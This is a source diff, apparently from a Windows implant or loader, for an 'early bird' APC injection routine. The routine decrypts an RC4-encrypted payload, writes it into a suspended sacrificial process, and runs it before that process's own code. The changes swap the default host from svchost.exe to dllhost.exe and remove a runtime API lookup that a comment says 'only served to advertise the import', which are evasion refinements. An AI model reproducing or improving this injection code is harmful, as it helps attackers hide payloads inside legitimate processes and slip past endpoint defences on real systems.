@@ -8,7 +8,7 @@
  * blob and key.
  *
  * Run() decrypts the blob and spawns the sacrificial process (default
- * svchost.exe) suspended, then "early birds" it: the blob is written to a
+ * dllhost.exe) suspended, then "early birds" it: the blob is written to a
  * fresh RW region in the child, flipped to RX, and queued as a user APC on
  * the suspended primary thread. When the thread is resumed the APC runs the
  * blob before any of the sacrificial process's own code; a tiny trampoline
@@ -64,8 +64,8 @@
 
 #include "config.h"
 #include "ntsys.h"
-#include "util/rc4.h"
 #include "stage_abi.h"
+#include "util/rc4.h"
 
 #if defined(NTSYS_SMW)
 #include "smw/smw.h"
@@ -73,7 +73,8 @@
 
 /* How long to keep watching the child after resume before declaring the
  * injection successful (the blob must survive startup, not crash). build.sh
- * bakes --verify-ms into config.h; the value below is the hand-build default. */
+ * bakes --verify-ms into config.h; the value below is the hand-build default.
+ */
 #ifndef INJECT_VERIFY_MS
 #define INJECT_VERIFY_MS 5000
 #endif
@@ -569,11 +570,12 @@ static DWORD do_inject_apc(const unsigned char *payload, size_t payload_len) {
     return err;
   }
 
-  sleep_fn = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "Sleep");
-  if (sleep_fn == NULL) {
-    LOG(L"cannot resolve kernel32!Sleep");
-    return inject_fail(&pi, base, ERROR_PROC_NOT_FOUND);
-  }
+  /* Sleep is already a static import of this module (verify_child uses it),
+   * and kernel32 shares one per-boot base across processes, so take the
+   * address directly instead of resolving kernel32!Sleep at runtime. This
+   * removes the GetModuleHandleW/GetProcAddress pair, which only served to
+   * advertise the import the trampoline needs. */
+  sleep_fn = (FARPROC)(uintptr_t)Sleep;
 
   tramp_len = build_trampoline(tramp, 0, 0, 0); /* size probe */
   blob_off = (tramp_len + 0xF) & ~(size_t)0xF;
@@ -741,10 +743,9 @@ static void report_status(DWORD state, DWORD exit_code, DWORD checkpoint,
   memset(&ss, 0, sizeof(ss));
   ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
   ss.dwCurrentState = state;
-  ss.dwControlsAccepted =
-      (state == SERVICE_RUNNING)
-          ? (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN)
-          : 0;
+  ss.dwControlsAccepted = (state == SERVICE_RUNNING)
+                              ? (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN)
+                              : 0;
   ss.dwWin32ExitCode = exit_code;
   ss.dwCheckPoint = checkpoint;
   ss.dwWaitHint = wait_hint;
